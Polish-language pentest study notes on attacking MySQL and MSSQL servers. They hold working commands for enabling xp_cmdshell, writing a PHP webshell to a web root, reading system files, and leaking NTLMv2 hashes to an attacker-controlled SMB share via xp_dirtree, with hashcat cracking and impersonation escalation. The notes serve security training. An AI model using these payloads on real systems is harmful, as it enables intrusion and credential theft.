# MYSQL, MSSQL

## 1. Wstęp i Rekonesans

- **Rola baz danych:** Przechowują poufne dane (poświadczenia, PII, finanse) i często działają na wysoko uprzywilejowanych kontach, co czyni je głównym celem do eskalacji uprawnień i ruchu lateralnego.
- **Porty domyślne:**
    - **MSSQL:** TCP/1433 (domyślny), UDP/1434 (instance resolution), TCP/2433 (tryb ukryty).
    - **MySQL:** TCP/3306.
- **Skanowanie wstępne (Nmap):** Pozwala na banner grabbing i wykrywanie wersji, nazw hostów czy domen:Bash

## 2. Mechanizmy Uwierzytelniania i Podatności

### MSSQL:

- **Windows Authentication Mode:** Domyślny tryb zintegrowany z Active Directory / Windows (zaufane konta nie muszą podawać dodatkowych poświadczeń).
- **Mixed Mode:** Obsługuje zarówno konta Windows/AD, jak i wbudowane konta SQL Server (nazwa użytkownika + hasło zarządzane w bazie).

### MySQL:

- Podatności historyczne (np. **CVE-2012-2122** w MySQL 5.6.x): Obejście uwierzytelnienia spowodowane błędem porównywania ciągów (string comparison bug) przy wielokrotnych próbach logowania z tym samym błędnym hasłem.

### Błędy konfiguracyjne (Misconfigurations):

- Dostęp bez poświadczeń (anonimowy), konta bez haseł lub zbyt szerokie uprawnienia przypisane użytkownikom/grupom.

## 3. Narzędzia do Łączenia z Bazami

### MySQL:

Bash

```
mysql -u julio -pPassword123 -h 10.129.20.13
```

### MSSQL:

- **Sqlcmd (z Windows):**
    
    DOS
    
    ```
    sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
    ```
    
    *(Parametry `-y` i `-Y` poprawiają czytelność wyników).*
    
- **Sqsh (z Linuxa):**Bash
    
    ```
    sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
    ```
    
    *(Parametr `-h` wyłącza nagłówki i stopki).*
    
- **Impacket `mssqlclient.py` (z Linuxa – domyślne narzędzie w tym teście):**BashBash
    
    ```
    mssqlclient.py -p 1433 julio@10.129.203.7
    ```
    
    *Dla uwierzytelniania Windows (konta lokalne/domenowe):*
    
    ```
    sqsh -S <IP> -U .\\julio -P 'MyPassword!' -h
    mssqlclient.py WIN-02/mssqlsvc:hasło@<IP>
    ```
    

## 4. Domyślne Bazy Systemowe

### MySQL:

- `mysql` – główne tablice systemowe (użytkownicy, uprawnienia).
- `information_schema` – metadane baz danych.
- `performance_schema` – monitorowanie wykonania serwera na niskim poziomie.
- `sys` – obiekty pomocnicze dla administratorów i deweloperów.

### MSSQL:

- `master` – przechowuje konfigurację instancji serwera.
- `msdb` – używana przez SQL Server Agent (harmonogramy, zadania).
- `model` – szablon dla każdej nowej bazy danych.
- `resource` – ukryta, tylko do odczytu baza z obiektami systemowymi.
- `tempdb` – obiekty tymczasowe dla zapytań SQL.

## 5. Składnia SQL i Podstawowa Enumeracja

### Wyświetlanie baz danych:

- *MySQL:* `SHOW DATABASES;`
- *MSSQL:* `SELECT name FROM master.dbo.sysdatabases; GO` *(w MSSQL polecenia wymagają słowa `GO`)*.

### Wybór bazy:

- *MySQL:* `USE nazwa_bazy;`
- *MSSQL:* `USE nazwa_bazy; GO`

### Wyświetlanie tabel:

- *MySQL:* `SHOW TABLES;`
- *MSSQL:* `SELECT table_name FROM nazwa_bazy.INFORMATION_SCHEMA.TABLES; GO`

### Odczyt danych z tabeli:

- *MySQL / MSSQL:* `SELECT * FROM users; GO`

## 6. Wykonywanie Poleceń Systemowych (Command Execution)

### MSSQL – `xp_cmdshell`:

- Domyślnie wyłączona rozszerzona procedura składowana. Działa w kontekście uprawnień konta usługi MSSQL (synchronously).
- **Włączanie procedury:**SQL
    
    ```
    EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
    EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
    GO
    ```
    
- **Użycie:**SQL
    
    ```
    xp_cmdshell 'whoami';
    GO
    ```
    

### MySQL – User Defined Functions (UDF):

- Ładowanie własnych funkcji w C/C++ w celu wykonywania kodu systemowego (rzadko spotykane w produkcji, ale możliwe).

## 7. Operacje na Plikach (Read & Write Local Files)

### Zapisywanie plików:

- **MySQL (`SELECT INTO OUTFILE`):** Wymaga uprawnienia `FILE`. Zależne od zmiennej globalnej `secure_file_priv` (jeśli pusta – brak ograniczeń; jeśli ścieżka – tylko tam; jeśli `NULL` – zablokowane).SQL
    
    ```
    SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
    ```
    
- **MSSQL (Ole Automation Procedures):** Wymaga uprawnień administratora i włączenia opcji:SQL
    
    ```
    EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
    EXECUTE sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
    GO
    -- Tworzenie pliku przez Scripting.FileSystemObject
    DECLARE @OLE INT; DECLARE @FileID INT;
    EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
    EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 15;
    EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>';
    EXECUTE sp_OADestroy @FileID; EXECUTE sp_OADestroy @OLE;
    GO
    ```
    

### Odczytywanie plików:

- **MySQL:** `SELECT LOAD_FILE("/etc/passwd");` (zależne od `secure_file_priv`).
- **MSSQL (`OPENROWSET`):** Domyślnie pozwala czytać pliki systemowe, do których konto ma uprawnienia:SQL
    
    ```
    SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents;
    GO
    ```
    

## 8. Ataki na Protokoły i Przechwytywanie Haszy (Hash Stealing)

- **Mechanizm:** Wykorzystanie niedokumentowanych procedur składowanych w MSSQL (`xp_dirtree` lub `xp_subdirs`), które odpytują zasób SMB. Zmusza to system operacyjny do przesłania NTLMv2 hasha konta usługowego działającego w tle.
- **Narzędzia nasłuchujące:** `Responder` lub `impacket-smbserver`.
- **Wywołanie w SQL:**SQL
    
    ```
    EXEC master..xp_dirtree '\\<TWÓJ_IP>\share\test';
    GO
    ```
    
- **Łamanie hasha:** Przechwycony hash NetNTLMv2 można złamać np. programem Hashcat (tryb 5600):Bash
    
    ```
    hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
    ```
    

## 9. Eskalacja Uprawnień i Ruch Lateralny

### Impersonacja użytkowników (`IMPERSONATE`):

- Pozwala przejąć uprawnienia innej roli/użytkownika w sesji SQL.
- **Sprawdzenie możliwości:**SQL
    
    ```
    SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
    ```
    
- **Użycie i weryfikacja:**SQL
    
    ```
    EXECUTE AS LOGIN = 'sa';
    SELECT SYSTEM_USER;
    SELECT IS_SRVROLEMEMBER('sysadmin'); -- Zwraca 1 jeśli pełny admin
    REVERT; -- Powrót do pierwotnego kontekstu
    ```
    

### Serwery powiązane (Linked Servers):

- Pozwalają na egzekucję zapytań SQL na innych instancjach lub systemach (np. Oracle, inny MSSQL).
- **Enumeracja:**SQL
    
    ```
    SELECT srvname, isremote FROM sysservers;
    -- lub
    SELECT name, product, provider, data_source FROM sys.servers;
    ```